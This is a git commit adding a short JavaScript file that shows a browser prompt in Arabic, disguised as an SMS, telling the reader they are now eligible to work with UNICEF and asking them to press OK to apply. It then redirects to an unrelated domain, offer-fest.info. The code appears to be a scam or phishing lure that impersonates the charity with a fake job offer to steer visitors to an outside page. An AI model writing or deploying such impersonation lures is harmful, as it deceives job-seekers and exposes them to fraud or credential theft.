50a2d3674d52f7500d6ad8c4ffcc12b776b12e0b
ekpesense <abantak9@gmail.com>
2025-03-06 23:08:04 -0800

    Create activation-unicef-2025.org.js

---
+++ activation-unicef-2025.org.js
@@ -0,0 +1,7 @@
+
+
+var password = 'تقدم الآن'
+password=prompt('SMS: مبروك لقد أصبحت مؤهلاً للعمل مع صندوق الأمم المتحدة للطفولة (اليونيسيف)، يرجى الضغط على زر "موافق" لتقديم الطلب   ','تقدم الآن');
+if (password != 'تقدم الآن') {
+location.href='https://offer-fest.info/unicef-2025.org.html';
+}
